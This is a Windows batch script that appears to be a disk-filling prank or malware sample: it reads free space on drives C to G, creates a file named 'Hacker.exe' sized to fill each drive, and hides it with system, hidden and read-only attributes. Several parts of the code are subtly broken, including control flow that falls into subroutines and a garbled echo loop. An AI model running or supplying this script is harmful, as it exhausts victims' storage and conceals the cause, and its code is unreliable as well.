@echo off
setlocal EnableDelayedExpansion

:: Define drive letters
set "drives=C D E F G"
set "freeSpaceFile=%temp%\freeSpace.tmp"
set "tempFilePrefix=%temp%\drive"

:: Obfuscated and complex version of getting free space
:getFreeSpace
    set "drive=%~1"
    set "tempFile=%tempFilePrefix%!drive!.tmp"
    wmic logicaldisk where "caption='%drive%:'" get freespace /value > "!tempFile!"
    for /f "tokens=2 delims==" %%A in ('findstr /i "FreeSpace" "!tempFile!"') do (
        set "free=!free!%%A"
    )
    del "!tempFile!"
    goto :eof

:: Obfuscated and complex version of creating and hiding a file
:createAndHideFile
    set "drive=%~1"
    set "free=%~2"
    set "filePath=!drive!:\Hacker.exe"
    if "!free!" gtr "0" (
        fsutil file createnew "!filePath!" !free!
        attrib +s +h +r "!filePath!"
        echo Created and hid file on !drive! with size !free! bytes.
    ) else (
        echo The drive !drive! is full or not available!
    )
    goto :eof

:: Main script execution
set "randomSuffix=!random!!random!"
for %%D in (%drives%) do (
    call :getFreeSpace %%D
    set "freeSpace%%D=!free!"
    call :createAndHideFile %%D !free!
)

:: Additional complex logic for demonstration
set "totalFree=0"
for %%D in (%drives%) do (
    set /a "totalFree+=!freeSpace%%D!"
    echo Free space on %%D: !freeSpace%%D! bytes
)

:: Obfuscated complex echo
set "msg=Script execution completed."
set "chars="
for /l %%i in (0,1,31) do (
    for /f "tokens=1,2 delims==" %%a in ('cmd /c "echo(%%msg:~%%i,1%%%"') do (
        set "chars=!chars!%%a"
    )
)
echo !chars!

pause
exit
